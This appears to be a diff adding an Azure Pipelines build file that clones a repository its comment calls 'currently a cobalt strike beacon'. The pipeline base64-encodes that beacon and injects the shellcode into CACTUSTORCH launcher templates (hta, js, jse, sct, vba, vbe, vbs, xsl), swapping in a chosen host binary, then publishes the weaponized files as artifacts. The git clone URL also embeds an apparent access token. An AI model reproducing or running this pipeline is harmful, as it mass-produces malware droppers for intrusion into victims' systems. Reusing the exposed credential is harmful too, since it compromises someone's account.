@@ -1,0 +1,227 @@
+pool:
+
+  name: Azure Pipelines
+
+#Your build pipeline references an undefined variable named ‘cat payload.b64’. Create or edit the build pipeline for this YAML file, define the variable on the Variables tab. See https://go.microsoft.com/fwlink/?linkid=865972
+
+
+
+steps:
+
+- task: UsePythonVersion@0
+
+  displayName: 'Use Python 3.x'
+
+
+
+- script: |
+   # Clones in the payload repository (currently a cobalt strike beacon)
+   # We discretely make sure this clones into a repo called "payload" just 
+   # to make the process more repo-name agnostic
+   git clone https://smith.nathan923:57dofql7nzdt2tok3b7zndcnni4erofxiqoiajsyypqooc73mcbq@dev.azure.com/smithnathan923/Operation%20Copy%20Cat/_git/payload payload
+   
+   # Write out our python replace script
+   # python3 replace.py <payload> <replace str> <b64 shellcode>
+   echo 'import sys;FILE=open(sys.argv[1]).read();REPLACE=sys.argv[2];PAYLOAD=open(sys.argv[3]).read();NEW=FILE.replace(REPLACE,PAYLOAD);fp=open(sys.argv[1],"w");fp.write(NEW);fp.close();' > replace.py
+   
+   # Base64 encode payload
+   base64 ./payload/$FILENAME -w 0 > payload.b64
+   
+
+  displayName: 'Git clone repo & setup '
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.js in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.hta
+   
+   # Use python to string replace payload
+   python3 replace.py CACTUSTORCH.hta TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA payload.b64
+   
+
+  displayName: 'Create: hta'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.js in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.js
+   
+   # Use python to string replace payload
+   python3 replace.py CACTUSTORCH.js TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA payload.b64
+   
+   
+   
+
+  displayName: 'Create: js'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.jse in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.jse
+   
+   # Use python to string replace payload
+   python3 replace.py CACTUSTORCH.jse TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA payload.b64
+   
+   
+   
+
+  displayName: 'Create: jse'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.sct in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.sct
+   
+   # Use python to string replace payload
+   
+   python3 replace.py CACTUSTORCH.sct TVroAAAAAFtSRVWJ5YHDco payload.b64
+   
+   
+   #sed -i 's|TVroAAAAAFtSRVWJ5YHDco|'"$(cat payload.b64)"'|g' CACTUSTORCH.sct
+   
+   
+   
+
+  displayName: 'Create: sct'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.vba in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Create a file with payload split up
+   
+   rm -f temp.txt
+   
+   printf 'code = code & \"' >> temp.txt;sed -e "s/.\{100\}/&\"\ncode = code \& \"/g" payload.b64 >> temp.txt;truncate -s-1 temp.txt;  printf '\"\n' >>temp.txt
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.vba
+   
+   # Use python3 to string replace payload
+   
+   python3 replace.py CACTUSTORCH.vba '    code = code & "TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgB"
+       code = code & "TM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqz"
+       code = code & "ckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUA"
+       code = code & "AAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAA"
+       code = code & "AAIAAAUAAAAAAAAABQAAAAA"' temp.txt
+   
+   # clean up temp file
+   rm -f temp.txt
+   
+   
+   
+
+  displayName: 'Create: vba'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.vbe in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.vbe
+   
+   # Use python to string replace payload
+   python3 replace.py CACTUSTORCH.vbe TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA payload.b64
+   
+
+  displayName: 'Create: vbe'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.js in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.vbs
+   
+   # Use python to string replace payload
+   python3 replace.py CACTUSTORCH.vbs TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA payload.b64
+   
+   
+
+  displayName: 'Create: vbs'
+
+
+
+- script: |
+   # Performs injection of shellcode into CACTUSTORCH.js in lieu of 
+   # current shellcode in file. We also choose to replace the selected 
+   # binary selection with that of the $binary env variable. 
+   
+   
+   # Use sed to string replace binary
+   
+   sed -i 's|rundll32.exe|'"${BINARY}"'|g' CACTUSTORCH.xsl
+   
+   # Use python to string replace payload
+   python3 replace.py CACTUSTORCH.xsl "YOUR BASE64 CODE GOES HERE" payload.b64
+   
+   
+
+  displayName: 'Create: xsl'
+
+
+
+- task: CopyFiles@2
+
+  displayName: 'Copy Files to: $(Build.ArtifactStagingDirectory)'
+
+  inputs:
+
+    TargetFolder: '$(Build.ArtifactStagingDirectory)'
+
+
+
+- task: PublishBuildArtifacts@1
+
+  displayName: 'Publish Artifact: cactustorch'
+
+  inputs:
+
+    ArtifactName: cactustorch
+
+
+
